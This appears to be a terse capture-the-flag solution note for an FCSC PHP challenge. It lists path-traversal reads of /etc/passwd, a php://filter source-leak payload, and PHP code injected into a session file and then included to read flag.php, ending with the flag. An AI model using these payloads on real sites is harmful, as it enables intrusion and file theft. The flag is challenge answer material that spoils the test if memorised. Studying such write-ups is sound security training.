@@ -1,0 +1,22 @@
+flag est filtree lorsqu'on le met dans ?monster=
+
+reussi avec fl%7Fag mais comme pas un monster useless
+
+got something at ../../../etc/passwd and /etc/hosts
+
+/index.php?monster=php://filter/read=convert.base64-encode/resource=index.php
+-> got index.php
+
+we want flag.php but strpos blocks it
+
+session_save_path("/sessions/") = we can read
+/index.php?monster=sessions/sess_b112ccb116944fa18da40b335829e4ae
+-> we see it has the last request in it
+
+first: (system and shell_exec disabled)
+/index.php?monster=<?php%20echo%20file_get_contents("flag.php");%20?>
+
+then:
+/index.php?monster=sessions/sess_b112ccb116944fa18da40b335829e4ae
+
+FCSC{83f5d0d1a3c9c82da282994e348ef49949ea4977c526634960f44b0380785622}
